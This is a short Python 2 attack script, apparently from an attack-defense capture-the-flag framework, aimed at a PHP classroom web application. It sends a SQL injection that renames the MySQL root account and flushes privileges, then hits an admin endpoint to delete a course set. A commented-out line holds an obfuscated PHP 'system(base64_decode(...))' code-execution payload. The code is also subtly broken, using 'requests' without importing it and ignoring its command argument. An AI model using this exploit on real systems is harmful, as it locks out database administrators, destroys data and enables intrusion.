#!/usr/bin/env python

from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback
import hashlib
import time


def vulnerable_attack(target,target_port,cmd):
        
    
    try:           
        # This payload may not work under some php versions
        #payload = "('sy'.'stem')(('bas'.'e64_'.'decode')('%s'))==0"%cmd
        #print payload
        res = block(target,target_port,cmd)
        res = cmd_prefix + res + cmd_postfix
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res



def block(target,target_port,cmd):
    s = requests.Session()
    ip = target
    url_11 = "http://%s:%s/app.php/classroom/1" % (ip,str(target_port))
    data = ");UPDATE mysql.user SET User='aaaaaaaaaaaa' WHERE user='root';FLUSH PRIVILEGES;#/manage"
    url_11 = url_11 + quote(data)
    print s.get(url_11).content


    url_final = 'http://%s:%s/app.php/admin/course_set/1/delete' % (ip,str(target_port)) 
    res = s.get(url_final).content
    return res
